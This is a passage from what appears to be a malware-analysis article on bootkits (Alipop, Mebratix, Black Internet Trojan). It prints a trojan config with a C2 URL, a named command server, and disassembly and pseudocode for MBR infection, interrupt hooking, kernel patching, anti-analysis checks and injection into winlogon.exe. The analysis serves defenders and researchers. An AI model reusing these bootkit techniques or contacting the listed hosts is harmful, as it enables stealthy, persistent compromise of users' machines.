DownLoadLelayTime=1
RunDelayTime=0
FirstRunExeTime=2
FirstPopWidTime=1
cjver=2
cjaddr=
[Link]
Link1=|http://66.79.168.187:55325/tuling.html</pre>
<p>Though the Alipop trojan uses the boot sector infection technique, it
 can be detected and deleted easily because there no methods are used to
 hide the malicious activity. The bootkit does not protect its boot 
sector code from disinfection. It is, therefore, possible to heal the 
infected system by manually editing the boot record with any 16-bit 
HEX-editor (such as WinHex).</p>
<h3 id="s6">Mebratix.b (Ghost Shadow)</h3>
<div class="aside">
<p>Symantec Security Response. <a href="https://web.archive.org/web/20180310110809/http://www.symantec.com/connect/pt-br/blogs/trojanmebratixb-ghost-mbr">Trojan.Mebratix.B — the Ghost in MBR</a>.</p>
</div>
<p>The Mebratix bootkit was mentioned for the first time in an entry on the Symantec Security Response blog.</p>
<p>The bootkit’s installer (MD5: <a href="https://web.archive.org/web/20180310110809/http://www.virustotal.com/file-scan/report.html?id=fad70faf837af18776fdbc0229bac397a6496840563c8e6f3501780dacbf7af6-1278106818">1b465d5c330d99bdccffd299bf71010f</a>, about 30 kB) does not have any notable characteristics.</p>
<h4>Boot code</h4>
<p>Mebratix’ boot code is an almost perfect clone of the standard 
Windows boot code. Let’s take a closer look at the two disassembled 
codes.</p>
<p>Windows boot code:</p>
<pre>seg000:00CA                 mov     ax, 201h   ; ah – number of function of 13th interrupt 13h (02h, read data from disk) 
                                               ; al – amount of sectors being read
seg000:00CD                 mov     bx, 7C00h  ; Address of buffer for data read
seg000:00D0                 mov     cx, [bp+2] ; Number of path and sector (bp points to a record in partition table)
seg000:00D3                 mov     dx, [bp+0] ; Number of head and disk
seg000:00D6                 int     13h
seg000:00D8                 jnb     short locret_12B</pre>
<p>Mebratix boot code:</p>
<pre>seg000:00CA                 mov     ax, 201h   ; ah - number of function of 13th interrupt 13h (02h, read data from disk)
                                               ; al - amount of sectors being read
seg000:00CD                 mov     bx, 7C00h  ; Address of buffer for data read
seg000:00D0                 <strong>mov cx, 2</strong>      ; Number of path and sector (bp points to a record in partition table)
seg000:00D3                 mov     dx, [bp+0] ; Number of head and disk
seg000:00D6                 int     13h
seg000:00D8                 jnb     short locret_12B</pre>
<p>As you can see, Mebratix’ boot code differs from the standard boot code by arguments of <code>mov</code>
 instruction with offset 00D0h from the start of the boot code. 
According to the developer’s intent, the original code performs the 
reading and transfers control to the first sector of the boot partition,
 whereas the bootkit’s code transfers control to the second sector with 
the extension of malicious code.</p>
<div class="figure"><img src="Bootkits%20%E2%80%93%20a%20new%20stage%20of%20development_files/infected_mbr_mebratix.jpg" alt="Fig. 11. Mebratix boot code (the instruction that differs from the standard boot code is highlighted)." width="652" height="331">
<p>Fig. 11. Mebratix boot code (the instruction that differs from the standard boot code is highlighted).</p>
</div>
<p>The bootkit’s code in the second sector of a disk reserves 63 kB of 
base memory in the same way as the Alipop bootkit. Then, it copies 
itself to 9700:0000h and sets a hook for the 13h interrupt:</p>
<pre>seg000:0229                 mov     si, 533h
seg000:022C                 xor     si, 120h
seg000:0230                 lodsw  ; read instruction from 0040h:0013h (base memory size in kB)
seg000:0231                 sub     si, 2
seg000:0234                 shl     ax, 6
seg000:0237                 and     ax, 0FFFh
seg000:023A                 shr     ax, 6
seg000:023D                 sub     [si], ax ; Reserve 63 kB of a base memory
seg000:023F                 xor     eax, eax
seg000:0242                 mov     ax, 9700h
seg000:0245                 mov     es, ax
seg000:0247                 assume es:nothing
seg000:0247                 shl     eax, 4
seg000:024B                 mov     si, 7C00h
seg000:024E                 xor     di, di
seg000:0250                 mov     ecx, 100h
seg000:0256                 rep movsw ; Copy code of 2 sector to 9700:0000h
seg000:0258                 mov     es:0Eh, eax
seg000:025D                 xor     bx, bx
seg000:025F                 mov     eax, [bx+4Ch]   
seg000:0263                 mov     word ptr [bx+4Ch], 0F9h ; Set address of 13h interrupt handler
seg000:0268                 mov     es:106h, eax            ; Save address of original handler
seg000:026D                 mov     word ptr [bx+4Eh], es   ; Set new value of handler selector
seg000:0270                 push    es
seg000:0271                 push    75h ; Transfer of control to the code by 75h offset
seg000:0274                 retf</pre>
<p>The next part of the boot code reads 59 sector of HDD (starting with 
sector 3) to the memory at 9700:0200h. These sectors contain all the 
other bootkit components. Moreover, sectors 3 to 6 are ciphered with xor
 operation with dynamic calculation of key byte at each iteration. Below
 is the fragment of the code that deciphers the sectors.</p>
<pre>seg000:0297                 mov     esi, 200h       ; Pointer to read data
seg000:029D                 mov     ebx, 3333h      ; Start constant for key calculation
seg000:02A3                 mov     ecx, 600h       ; Size of data for deciphering (3 sectors)
seg000:02A9 loc_2A9:
seg000:02A9                 call    GetXorKey       ; Get key for current iteration
seg000:02AC                 xor     [esi], al
seg000:02AF                 add     esi, 1
seg000:02B3                 sub     ecx, 1
seg000:02B7                 jnz     short loc_2A9

                            ...                            
                            
seg000:03C5 GetXorKey       proc near               ; Key calculation
seg000:03C5                 imul    ebx, 343FDh     
seg000:03CC                 add     ebx, 269EC3h
seg000:03D3                 mov     eax, ebx
seg000:03D6                 shr     eax, 10h
seg000:03DA                 and     eax, 0FFh
seg000:03E0                 retn
seg000:03E0 GetXorKey       endp</pre>
<p>It is possible that the key calculation code was specified in a 
separate procedure to allow polymorphic encryption, but spred bootkits 
used statically encrypted code.</p>
<p>The 13h interrupt handler modifies <code>OSLOADER.EXE</code> code in the exact same way as the Alipop bootkit.</p>
<h4>Protected mode code</h4>
<p>The bootkit’s protected mode code is called from the modified 
OSLOADER.EXE module and is performed to initialize and launch the 
bootkit’s kernel mode driver. Let’s examine this code more thoroughly:</p>
<pre>seg001:00000604                 mov     esi, eax
seg001:00000606                 mov     eax, [esp-4]
seg001:0000060A                 and     eax, 0FFFFF000h ; Get address of BootDriverListHead variable
seg001:0000060F                 push    ebx
seg001:00000610                 call    $+5
seg001:00000615                 pop     ebx
seg001:00000616                 and     ebx, 0FFFFF000h
seg001:0000061C                 or      ebx, 600h ; Calculate address of bootkit’s protected mode code by return address
seg001:00000622                 mov     [ebx], eax ; Save BootDriverListHead
seg001:00000624                 mov     eax, esi
seg001:00000626                 pop     ebx
seg001:00000627                 test    eax, eax
seg001:00000629                 pushf
seg001:0000062A                 jnz     short loc_634
seg001:0000062C                 add     dword ptr [esp+4], 0
seg001:00000631                 jmp     short loc_634
seg001:00000634 loc_634:
seg001:00000634                 pusha
seg001:00000635                 call    $+5
seg001:0000063A                 pop     ebx
seg001:0000063B                 and     ebx, 0FFFFF000h
seg001:00000641                 lea     ecx, large ds:106h
seg001:00000647                 mov     eax, [ebx+ecx] ; Get saved address of 13h interrupt handler
seg001:0000064A                 mov     ecx, cr0
seg001:0000064D                 push    ecx
seg001:0000064E                 btr     ecx, 10h ; Reset WP-bit (disable virtual memory write-protection)
seg001:00000652                 mov     cr0, ecx
seg001:00000655                 or      byte ptr ds:0C0000000h, 3
seg001:0000065C                 mov     large ds:4Ch, eax ; Restore original 13h interrupt handler
seg001:00000661                 mov     byte ptr ds:0C0000000h, 20h
seg001:00000668                 pop     ecx
seg001:00000669                 mov     cr0, ecx ; Set reseted WP-bit
seg001:0000066C                 or      ebx, 600h
seg001:00000672                 mov     eax, [ebx]
seg001:00000674                 sub     ebx, 600h
seg001:0000067A                 mov     esi, eax   ; esi - BootDriverListHead
seg001:0000067C loc_67C:
seg001:0000067C                 mov     esi, [esi] ; esi – pointer to _LDR_DATA_TABLE_ENTRY for specific module
seg001:0000067E                 cmp     esi, eax
seg001:00000680                 jz      loc_763
seg001:00000686                 mov     ecx, [esi+18h]       ; Get module boot address from _LDR_DATA_TABLE_ENTRY
seg001:00000689                 cmp     word ptr [ecx], 'ZM' ; Check MZ signature of module’s header

                                ...</pre>
<p>After executing this code, the bootkit searches through all the 
loaded executable modules to find a section with 200 or more bytes of 
free space in the end. The bootkit’s driver loader code is copied in the
 found module (this code is originally located in the HDD’s sector 4).</p>
<pre>seg001:000006C7 loc_6C7: 
seg001:000006C7                 sub     edx, 28h ; '('
seg001:000006CA                 mov     ecx, [edx+8]       ; ecx – section VirtualSize
seg001:000006CD                 or      ecx, 0FFFh
seg001:000006D3                 sub     ecx, 1FFh
seg001:000006D9                 add     ecx, [edx+0Ch]     ; Add VirtualAddress to ecx VirtualAddress
seg001:000006DC                 add     ecx, [esi+18h]     ; Add module loading address to ecx
seg001:000006DF                 cmp     dword ptr [ecx], 0 ; Check free space in the end of the section
seg001:000006E2                 jnz     short loc_67C      
seg001:000006E4                 mov     edi, ecx
seg001:000006E6                 push    edi
seg001:000006E7                 lea     esi, [ebx+600h]
seg001:000006ED                 mov     ecx, 80h           
seg001:000006F2                 rep movsd                  ; Copy 200h bytes</pre>
<p>In most cases, bootkits use '<code>.data</code>' to store code. This 
section belongs to the OS kernel image, loaded into the memory. As you 
can see from the dump of the module’s header, there is enough space to 
inject the loader code in the ‘<code>.data</code>’ section.</p>
<pre>kd&gt; dh -s nt

...

SECTION HEADER #5
   .data name
   16EA0 virtual size
   6E800 virtual address
   16F00 size of raw data
   6E800 file pointer to raw data
       0 file pointer to relocation table
       0 file pointer to line numbers
       0 number of relocations
       0 number of line numbers
C8000040 flags
         Initialized Data
         Not Paged
         (no align specified)
         Read Write         
...</pre>
<p>To transfer control to the driver loader code, the bootkit modifies the <code>nt!PspCreateProcess()</code> kernel function in such a way that its beginning will contain a call for the bootkit’s driver loader instead of the <code>nt!_SEH_prolog()</code> function call.</p>
<p>The <code>nt!PspCreateProcess()</code> function code before modification:</p>
<pre>kd&gt; u nt!PspCreateprocess
nt!PspCreateProcess:
805d0866 681c010000      push    11Ch
805d086b 68c8a84d80      push    offset nt!ObWatchHandles+0x664
805d0870 e81bb3f6ff      call    nt!_SEH_prolog</pre>
<p>The <code>nt!PspCreateProcess()</code> function code after modification:</p>
<pre>nt!PspCreateProcess:
805c6a8c 681c010000      push    11Ch
805c6a91 68b09e4d80      push    offset nt!ObWatchHandles+0x664
805c6a96 e88af8f7ff      call    <strong>80546325</strong></pre>
<p>Since <code>nt!PspCreateProcess()</code> isn’t exported by the kernel, the bootkit searches it by analyzing the code of the exported <code>nt!PsCreateSystemProcess()</code> process, byte-by-byte searching for the opcode of the first <code>call</code> instruction (E8h) – its argument is the address of the <code>nt!PspCreateProcess()</code> function:</p>
<pre>kd&gt; u nt!PsCreateSystemProcess+0xa
nt!PsCreateSystemProcess+0xa:
805d11da 50              push    eax
805d11db 50              push    eax
805d11dc ff35d0c26780    push    dword ptr [nt!PspInitialSystemProcessHandle]
805d11e2 ff7510          push    dword ptr [ebp+10h]
805d11e5 ff750c          push    dword ptr [ebp+0Ch]
805d11e8 ff7508          push    dword ptr [ebp+8]
805d11eb e876f6ffff      call    <strong>nt!PspCreateProcess</strong>
805d11f0 5d              pop     ebp</pre>
<p>The <code>nt!PspCreateProcess()</code> call is performed at the initialization of the executive kernel subsystem:</p>
<pre>kd&gt; kb
ChildEBP RetAddr  Args to Child              
805499a0 8069c0dc 8066fb50 001f0fff 80549a24 nt!PspCreateProcess+0xa
80549a4c 8069c419 80078000 80549be8 8068509c nt!PspInitPhase0+0x34e
80549a58 8068509c 00000000 80078000 80552740 nt!PsInitSystem+0x33
80549be8 80691f28 00000000 80078000 8003fc00 nt!ExpInitializeExecutive+0x742
80549c3c 8068fa9f 805529a0 80552740 80549f00 nt!KiInitializeKernel+0x3b2
00000000 00000000 00000000 00000000 00000000 nt!KiSystemStartup+0x2bf</pre>
<h4>Driver loader</h4>
<p>The code of the bootkit’s kernel mode driver loader performs the following:</p>
<ol>
<li>Gets the PID of the current process with the <code>nt!PsGetCurrentProcessId()</code> function. If the received value differs from 4 (the fixed PID value for the <code>System</code> process), - the <code>nt!_SEH_prolog()</code> call and a return to the nt!PspCreatepProcess() is performed.</li>
<li>Gets the address of the <code>nt!psLoadedModulesList</code> kernel global variable through signature analysis of the <code>nt!KeCapturePersistentThreadState()</code> function code.</li>
<li>Reserves 10000h bytes in the memory for the image of bootkit’s kernel mode driver with the <code>nt!ExAllocatePoolWithTag()</code> function.</li>
<li>Copies the headers and the sections of a driver into an allocated area of the memory.</li>
<li>Restores the modified <code>nt!PspCreateprocess()</code> function code.</li>
<li>Calls the bootkit’s driver entry point.</li>
</ol>
<h4>Driver and payload</h4>
<p>The goal of the bootkit’s driver is to inject user mode code in the <code>explorer.exe</code> process and hook such IRP-requests handlers as <code>IRP_MJ_READ</code>/<code>IRP_MJ_WRITE</code> of the disk driver <code>Disk.sys</code> (<code>\Driver\Disk</code>).
 These hooks protect disk sectors with the bootkit components from the 
read or rewrite attempts by antivirus software. It should be noted that 
the driver code is unstable: in some cases, the trojan fails to install 
kernel hooks during its installation.</p>
<p>The user-mode code sends HTTP requests to the <code>meifawu.com</code> server. The Trojan configuration file is loaded from <code>http://meifawu.com/n.txt</code>.</p>
<div class="figure"><img src="Bootkits%20%E2%80%93%20a%20new%20stage%20of%20development_files/http_requests_mebratix.jpg" alt="Fig. 12. Server requests." width="628" height="112">
<p>Fig. 12. Server requests.</p>
</div>
<h3 id="s7">Black Internet Trojan</h3>
<p>The Black Internet Trojan bootkit appeared only recently, and if we 
are to judge by the activity on antivirus Web forums, it is both the 
least known and the most widespread of all the new bootkits. One of the 
first sources of information about the infection was the 
English-language antivirus forum <a href="https://web.archive.org/web/20180310110809/http://forums.majorgeeks.com/showthread.php?t=217807">MajorGeeks</a>, and some days later Russian <a href="https://web.archive.org/web/20180310110809/http://virusinfo.info/showthread.php?t=81088">VirusInfo</a>.</p>
<h4>Installer and self-defense</h4>
<p>The bootkit’s installer (MD5: <a href="https://web.archive.org/web/20180310110809/http://www.virustotal.com/file-scan/report.html?id=3a55b60fed8c8aa3bdffee4a18084a4dfe85545e07d8ed5d12c84eb07da1c698-1278191896">e35310220715287c5765b273a1797836</a>,
 about 1.2 MB) is protected with an unknown encrypter. The decipher 
procedure contains the code to detect VMware virtual machines:</p>
<pre>.text:004010A8                 push    401113h ; Address of exception SEH-handler
.text:004010AD                 push    large dword ptr fs:0
.text:004010B4                 push    eax
.text:004010B5                 mov     eax, 337h
.text:004010BA                 pop     eax
.text:004010BB                 mov     large fs:0, esp
.text:004010C2                 mov     eax, 564D5868h ; 'VMXh' – magic constant
.text:004010C7                 mov     ebx, 0
.text:004010CC                 mov     ecx, 0Ah
.text:004010D1                 xchg    eax, ebx
.text:004010D2                 push    ebx
.text:004010D3                 push    eax
.text:004010D4                 pop     ebx
.text:004010D5                 pop     eax
.text:004010D6                 mov     edx, 5658h ; Number of VMware backdoor I/O port
.text:004010DB                 in      eax, dx    ; Read data from port.
                                                  ; On usual machine (not virtual) 
                                                  ; this instruction generates exception </pre>
<p>To disable this bootkit’s self-defense mechanism, add a line that 
disables the “VMWare backdoor” to the end of the VMWare configuration 
file (<code>.vmx</code>):</p>
<pre>monitor_control.restrict_backdoor = "TRUE"</pre>
<p>The bootkit’s installer detects its execution with limited permissions through the <a href="https://web.archive.org/web/20180310110809/http://msdn.microsoft.com/en-us/library/aa446671%28VS.85%29.aspx">GetTokenInformation</a> function call with the <code>TokenElevation</code>
 parameter. If the execution is performed under UAC, the installer 
restarts its process in a cycle. Therefore, the user will get warnings 
from the security system until he permits the execution of the bootkit’s
 installer with maximum permissions.</p>
<pre>// Check OS version for launch under Windows Vista and higher
  GetVersionExW(&amp;VersionInformation);
  if (VersionInformation.dwMajorVersion &gt;= 6)
  {
      v4 = GetCurrentProcess();
      if (!OpenProcessToken(v4, 0x20008u, &amp;TokenHandle) ||
          !GetTokenInformation(TokenHandle, TokenElevation, &amp;TokenInformation, 4u, &amp;ReturnLength))
          return 0;

      if (!TokenInformation)
      {
          // Current process was launched with limited permissions
          if (GetModuleFileNameW(0, &amp;Filename, 0x104u))
          {
              ExecInfo.cbSize = 60;
              ExecInfo.fMask = 0;
              ExecInfo.hwnd = 0;
              ExecInfo.lpVerb = L"runas";
              ExecInfo.lpFile = &amp;Filename;
              ExecInfo.lpParameters = 0;
              ExecInfo.lpDirectory = 0;
              ExecInfo.nShow = 0;
              ExecInfo.hInstApp = 0;

              // Launch of another process instance
              while (!ShellExecuteExW(&amp;ExecInfo));
          }

          return 0;
      }
  }</pre>
<div class="figure"><img src="Bootkits%20%E2%80%93%20a%20new%20stage%20of%20development_files/uac.jpg" alt="Fig. 13. UAC warning at installer launch." width="458" height="236">
<p>Fig. 13. UAC warning at installer launch.</p>
</div>
<p>Finally, the installer detects an active <a href="https://web.archive.org/web/20180310110809/http://technet.microsoft.com/en-us/sysinternals/bb896645.aspx">Process Monitor</a>
 utility by looking up the specific value of window class. It is 
performed just before the installation of boot code to the disk:</p>
<pre>.text:00402835 sub_402835      proc near
.text:00402835                 push    0                ; lpWindowName
.text:00402837                 push    offset ClassName ; "PROCMON_WINDOW_CLASS"
.text:0040283C                 call    ds:FindWindowW
.text:00402842                 neg     eax
.text:00402844                 sbb     eax, eax
.text:00402846                 neg     eax
.text:00402848                 retn
.text:00402848 sub_402835      endp</pre>
<h4>Boot code</h4>
<p>Unlike other known bootkits, which store their components in 63 
sectors before the first partition, the Black Internet trojan stores its
 components in unlabeled area immediately after the last partition.</p>
<pre>"CreateFile", "\Device\Harddisk0\DR0", "Desired Access: Generic Read/Write, Disposition: Open"
"ReadFile",   "\Device\Harddisk0\DR0", "Offset: 0, Length: 512"
"DeviceIoControl", "\Device\Harddisk0\DR0", "Control: IOCTL_DISK_GET_LENGTH_INFO"
"ReadFile",   "\Device\Harddisk0\DR0", "Offset: 3,216,310,272, Length: 512"
"WriteFile",  "\Device\Harddisk0\DR0", "Offset: 3,216,310,272, Length: 512"
"ReadFile",   "\Device\Harddisk0\DR0", "Offset: 3,216,310,272, Length: 512"
"WriteFile",  "\Device\Harddisk0\DR0", "Offset: 3,216,310,272, Length: 512"
"WriteFile",  "\Device\Harddisk0\DR0", "Offset: 3,216,344,064, Length: 43,520"
"ReadFile",   "\Device\Harddisk0\DR0", "Offset: 0, Length: 512"
"ReadFile",   "\Device\Harddisk0\DR0", "Offset: 3,216,310,272, Length: 512"
"ReadFile",   "\Device\Harddisk0\DR0", "Offset: 3,216,310,272, Length: 512"
"WriteFile",  "\Device\Harddisk0\DR0", "Offset: 3,216,310,272, Length: 512"
"WriteFile",  "\Device\Harddisk0\DR0", "Offset: 3,216,310,784, Length: 512"
"WriteFile",  "\Device\Harddisk0\DR0", "Offset: 0, Length: 512"
"ReadFile",   "\Device\Harddisk0\DR0", "Offset: 3,216,310,272, Length: 512"
"WriteFile",  "\Device\Harddisk0\DR0", "Offset: 3,216,310,272, Length: 512"
"WriteFile",  "\Device\Harddisk0\DR0", "Offset: 3,216,311,296, Length: 32,768"
"ReadFile",   "\Device\Harddisk0\DR0", "Offset: 3,216,310,272, Length: 512"
"WriteFile",  "\Device\Harddisk0\DR0", "Offset: 3,216,310,272, Length: 512"
"WriteFile",  "\Device\Harddisk0\DR0", "Offset: 3,216,387,584, Length: 9,216"
"ReadFile",   "\Device\Harddisk0\DR0", "Offset: 3,216,310,272, Length: 512"
"WriteFile",  "\Device\Harddisk0\DR0", "Offset: 3,216,310,272, Length: 512"
"WriteFile",  "\Device\Harddisk0\DR0", "Offset: 3,216,396,800, Length: 25,088"
"ReadFile",   "\Device\Harddisk0\DR0", "Offset: 3,216,310,272, Length: 512"
"WriteFile",  "\Device\Harddisk0\DR0", "Offset: 3,216,310,272, Length: 512"
"WriteFile",  "\Device\Harddisk0\DR0", "Offset: 3,216,421,888, Length: 31,232"
"ReadFile",   "\Device\Harddisk0\DR0", "Offset: 3,216,310,272, Length: 512"
"WriteFile",  "\Device\Harddisk0\DR0", "Offset: 3,216,310,272, Length: 512"
"WriteFile",  "\Device\Harddisk0\DR0", "Offset: 3,216,453,120, Length: 512"
"CloseFile",  "\Device\Harddisk0\DR0"</pre>
<p>The bootkit’s booting sector defines the location of this unlabelled 
area while reading the MBR-located partition table. Then the bootkit 
reads the 64 sectors with all the other components of the bootkit.</p>
<pre>seg000:001F                 xor     eax, eax
seg000:0022                 mov     si, 7BEh      ; si – pointer to partition table
seg000:0025                 mov     cl, 4         ; Amount of records in partition table
                
                            ...
seg000:0031 loc_31:
seg000:0031                 cmp     [si+8], eax
seg000:0035                 jb      short loc_3F
seg000:0037                 mov     eax, [si+8]   ; Set number of first sector of partition to eax
seg000:003B                 add     eax, [si+0Ch] ; Summarize it with partition’s size in sectors
seg000:003F loc_3F:
seg000:003F                 add     si, 10h
seg000:0042                 loop    loc_31        ; Go to a next record in partition table
seg000:0044                 or      eax, eax
seg000:0047                 jz      short loc_5F
seg000:0049                 add     eax, 2        ; Sector where reading should be started
seg000:004D                 mov     cx, 40h       ; Amount of sectors being read
seg000:0050                 mov     bx, 7C00h     ; Memory address to write data being read
seg000:0053                 call    sub_A1        ; Function that reads data with 13h interrupt (AH=42h);
seg000:0056                 jb      short loc_5F
seg000:0058                 nop
seg000:0059                 nop
seg000:005A                 jmp     far ptr 0:7C00h ; Transfer control to read code</pre>
<p>Then the bootkit performs a series of standard actions that were described in the analysis of the previous 2 malicious programs:</p>
<ol>
<li>Reservation of 4 kB in the base memory.</li>
<li>Interception of the 13h interrupt.</li>
<li>Signature search and modification of the <code>OSLOADER.EXE</code> code in <code>int 13h</code> handler.</li>
<li>Reading and execution of the boot code of the system partition.</li>
</ol>
<h4>Protected mode code</h4>
<p>Next, we will examine the bootkit’s protected mode code called from the modified <code>OSLOADER.EXE</code> module.</p>
<p>The bootkit’s protected mode code initializes the kernel mode driver 
loader. The following operations are performed for this purpose:</p>
<ol>
<li>Signature analysis of the <code>nt!Phase1Initialization()</code> function and detection of the <code>nt!IoInitSystem()</code> function entry point.</li>
<li>Replacement of the <code>nt!IoInitSystem()</code> call with bootkit’s driver loader call</li>
<li>Copying the loader code into the area of memory right after the OS kernel.</li>
</ol>
<p>Address of <code>_BlLoaderBlock</code> structure, which contains a pointer to the list of loaded modules, is spotted by signature in the <code>OSLOADER.EXE</code> code.</p>
<pre>seg001:000069D4                 sub     dword ptr [esp], 6
seg001:000069D8                 call    sub_6BB4           ; Get driver loader address 
                                                           ; (is saved in esi)
seg001:000069DD                 mov     ecx, 6
seg001:000069E2                 rep movsb
seg001:000069E4                 sub     esi, 6
seg001:000069E7                 mov     edi, [esp+2Ch]
seg001:000069EB                 and     edi, 0FFF00000h
seg001:000069F1                 mov     al, 0C7h           ; Signature search for _BlLoaderBlock
seg001:000069F3 loc_69F3:
seg001:000069F3                 scasb
seg001:000069F4                 jnz     short loc_69F3
seg001:000069F6                 cmp     dword ptr [edi], 40003446h
seg001:000069FC                 jnz     short loc_69F3
seg001:000069FE loc_69FE:
seg001:000069FE                 mov     al, 0A1h
seg001:00006A00                 scasb
seg001:00006A01                 jnz     short loc_69FE
seg001:00006A03                 mov     eax, [edi]         ; eax – pointer to _BlLoaderBlock
seg001:00006A05                 mov     eax, [eax]
seg001:00006A07                 mov     eax, [eax]         ; eax - _LDR_DATA_TABLE_ENTRY for a kernel
seg001:00006A09                 mov     edi, [eax+18h]     ; edi – kernel loadind address
seg001:00006A0C                 mov     ecx, [edi+3Ch]
seg001:00006A0F                 mov     ecx, [ecx+edi+50h] ; ecx – size of kernel image (SizeOfImage)
seg001:00006A13                 call    sub_6B3D           ; Search for nt!IoInitSystem() call in nt!Phase1Initialization() code
                                                           ; (is saved in edx)
seg001:00006A18                 jnz     short loc_6A66
seg001:00006A1A                 mov     edx, [ebx]         ; Relocation of original instruction call nt!IoInitSystem()
seg001:00006A1C                 lea     edx, [ebx+edx+4]
seg001:00006A20                 mov     [esi+0Ah], edx
seg001:00006A23                 add     edi, ecx
seg001:00006A25                 jmp     short loc_6A36

                                ...
seg001:00006A36 loc_6A36:
seg001:00006A36                 add     edi, 0FFFh
seg001:00006A3C                 and     edi, 0FFFFF000h
seg001:00006A42                 sub     edi, 800h
seg001:00006A48                 mov     ecx, 6A3h
seg001:00006A4D                 push    edi
seg001:00006A4E                 rep movsb                  ; Copying driver loader to the area of memory right after OS kernel
seg001:00006A50                 pop     edi
seg001:00006A51                 add     edi, 0Eh
seg001:00006A54                 sub     edi, ebx
seg001:00006A56                 sub     edi, 4
seg001:00006A59                 mov     [ebx], edi         ; Modification of nt!IoInitSystem() call
seg001:00006A5B                 xchg    esi, edi
seg001:00006A5D                 mov     ecx, 644h
seg001:00006A62                 sub     edi, ecx
seg001:00006A64                 rep stosb</pre>
<p>The previous listing contains an algorithm for the installation of <code>IoInitSystem()</code> function hook. Let’s take a closer look at the interception itself.</p>
<p>The code of the <code>nt!Phase1Initialization()</code> function before the modification:</p>
<pre>nt!Phase1Initialization+0x9a1:
80685fc9 6a4b            push    4Bh
80685fcb 6a19            push    19h
80685fcd e83877e6ff      call    nt!InbvSetProgressBarSubset
80685fd2 ffb590fbffff    push    dword ptr [ebp-470h]
80685fd8 e859140000      call    nt!IoInitSystem
80685fdd 84c0            test    al,al</pre>
<p>The code of the <code>nt!Phase1Initialization()</code> function after the modification:</p>
<pre>nt!Phase1Initialization+0x9a1:
80685fc9 6a4b            push    4Bh
80685fcb 6a19            push    19h
80685fcd e83877e6ff      call    nt!InbvSetProgressBarSubset
80685fd2 ffb590fbffff    push    dword ptr [ebp-470h]
80685fd8 e831980400      call    <strong>806cf80e</strong>
80685fdd 84c0            test    al,al</pre>
<h4>Driver loader</h4>
<p>The kernel mode driver loader performs the following operations:</p>
<ol>
<li>Restores the original <code>nt!IoInitSystem()</code> call in a code of <code>nt!Phase1Initialization()</code> function.</li>
<li>Calls <code>nt!IoInitSystem()</code> with repeated transfer of control to the driver loader via a replaced return address in a stack.</li>
<li>Searches for the OS kernel load address by a first vector in the 
interrupt table. The address of this table is obtained by using the <code>sidt</code> instruction.</li>
<li>Searches by signature for the address of the kernel global variable <code>nt!PsLoadedModuleList</code> – a list of kernel mode loaded modules. Particularly, the <code>nt!PsLoadedModuleList</code> address is obtained from a pointer to this variable in the code of non-exported function <code>nt!IopWriteDriverList()</code>.</li>
<li>Looks up the following exported functions and kernel variables addresses by hashes of their name: <code>ExAllocatePool</code>, <code>ExFreePool</code>, <code>KeLoaderBlock</code>, <code>NtClose</code>, <code>NtCreateFile</code>, <code>NtReadFile</code>.</li>
<li>Reads the kernel mode driver from the unlabeled area at the end of a disk.</li>
<li>Sets up an executable driver image and transfers control to its entry point.</li>
<li>Returns control to <code>nt!Phase1Initialization()</code>.</li>
</ol>
<h4>Driver and payload</h4>
<p>The bootkit’s driver is used for the injection of user-mode code into the <code>winlogon.exe</code>
 process. For this purpose it creates a system thread which polls the 
process list in a cycle, analyzing two-linked lists of the <code>_EPROCESS</code> kernel and looking for the required process by the name of the executable file. Offsets of the required fields for the <code>_EPROCESS</code> and <code>_ETHREAD</code>
 structures are stored in global variables with the values being 
initialized according to the version of the operating system kernel. The
 value of the kernel version can be obtained with <code>PsGetVersion</code>/<code>RtlGetVersion</code> functions. Here you can see the pseudocode of a function, which searches the process by name.</p>
<pre>// function, which searches process by name (returns pointers to _EPROCESS and _ETHREAD)
  signed int __stdcall sub_113EC(const char *ProcessName, int a2, int a3)
  {
      int ProcessEntry; // esi@1
      PEPROCESS CurrentProcess; // eax@1
      int ThreadListStart; // edi@8
      int ThreadEntry; // esi@8
      int Thread; // eax@9
      unsigned int Teb; // eax@12
      int ProcessListStart; // [sp+18h] [bp+Ch]@1

      *(_DWORD *)a2 = 0;
      *(_DWORD *)a3 = 0;

      // gets pointer to a list of active processes from _EPROCESS structure of current process
      CurrentProcess = IoGetCurrentProcess();
      ProcessEntry = (int)((char *)CurrentProcess + EPROCESS_ActiveProcessLinks);
      ProcessListStart = (int)((char *)CurrentProcess + EPROCESS_ActiveProcessLinks);

      // lists all active processes and searches necessary executable file by name
      while (!*(_BYTE *)(ProcessEntry + EPROCESS_ImageFileName) ||
             stricmp(ProcessName, (const char *)(ProcessEntry + EPROCESS_ImageFileName)))
      {
          ProcessEntry = *(_DWORD *)ProcessEntry;
          if (ProcessListStart == ProcessEntry)
          {
              // last record in a list (necessary process is not found)
              goto LABEL_7;
          }
      }

      *(_DWORD *)a2 = ProcessEntry - EPROCESS_ActiveProcessLinks;

  LABEL_7:
      if (*(_DWORD *)a2)
      {
          // gets a pointer to the list of threads of found process
          ThreadEntry = *(_DWORD *)(EPROCESS_ThreadListHead + ProcessEntry);
          ThreadListStart = ThreadEntry;

          // lists all process threads
          do
          {
              Thread = ThreadEntry - ETHREAD_ThreadListEntry;
              *(_DWORD *)a3 = ThreadEntry - ETHREAD_ThreadListEntry;
              if (byte_136C0)
              {
                 // checks integrity of thread environment block (_TEB)
                 Teb = *(_DWORD *)(Thread + 0x20);
                 if (Teb &amp;&amp; Teb &lt; (unsigned int)MmSystemRangeStart)
                     return 1;
              }
              else
              {
                  // thread should be system thread
                  if (!PsIsSystemThread(Thread))
                      return 1;
              }
              ThreadEntry = *(_DWORD *)ThreadEntry;
          }
          while (ThreadEntry != ThreadListStart);
      }

      return 0;
  }</pre>
<p>After getting the pointers to the necessary process and its valid 
thread, the kernel mode driver reads the trojan’s user mode code from 
the unlabeled area of a disk and injects it in the <code>winlogon.exe</code> process.</p>
<pre>signed int __stdcall sub_114B2(int Thread, int Process)
{
    signed int result; // eax@2
    char Apc; // [sp+4h] [bp-68h]@8
    char ApcState; // [sp+34h] [bp-38h]@7
    LARGE_INTEGER Timeout; // [sp+4Ch] [bp-20h]@9
    int v7; // [sp+54h] [bp-18h]@5
    void *Payload; // [sp+58h] [bp-14h]@4
    ULONG AllocationSize; // [sp+5Ch] [bp-10h]@4
    PVOID BaseAddress; // [sp+60h] [bp-Ch]@1
    HANDLE EventHandle; // [sp+64h] [bp-8h]@1
    HANDLE Handle; // [sp+68h] [bp-4h]@1

    BaseAddress = 0;
    EventHandle = 0;
    Handle = 0;

    // gets process descriptor by pointer to _EPROCESS
